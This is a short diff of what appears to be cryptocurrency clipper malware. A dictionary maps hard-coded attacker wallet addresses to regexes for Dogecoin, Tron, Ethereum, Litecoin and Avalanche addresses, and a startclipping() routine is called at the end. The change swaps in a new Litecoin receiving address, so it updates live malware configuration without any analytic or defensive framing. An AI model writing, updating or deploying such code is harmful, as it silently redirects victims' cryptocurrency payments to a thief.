@@ -110,7 +110,7 @@ coinsssss = {
     'DBBaxUBzXAZqnbaHZk8CbpZ6CVGmC1Euvn'     : r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b',
     'TQw5weBndhXq9mLkPDwBXeDWb7vcVDGTUk'      : r'\bT[A-HJ-NP-Za-km-z1-9]{33}\b',
     '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'    : r'\b0x[a-fA-F0-9]{40}\b',
-    'LX44QNxXmmnUsttkzdAgMubS6dQb7nHNha'      : r'\b(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})\b(?![0-9A-Za-z])',
+    'LY8Atic4qaG3yp5F9RtYiQxP59HCrdGaSb'      : r'\b(?:L[a-km-zA-HJ-NP-Z1-9]{26,33}|M[a-km-zA-HJ-NP-Z1-9]{26,33}|3[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1q[a-z0-9]{39}|ltc1p[a-z0-9]{58})\b(?![0-9A-Za-z])',
     '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\b0x[a-fA-F0-9]{40}\b',
     '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'     : r'\bX-avax1[0-9a-z]{38}\b',
     '0xcC1A7d8Ef8a015C88e9E5D2edd648804C164064b'      : r'\b0x[a-fA-F0-9]{40}\b',
@@ -168,3 +168,4 @@ def startclipping():
 launchnotif()
 
 startclipping()
+
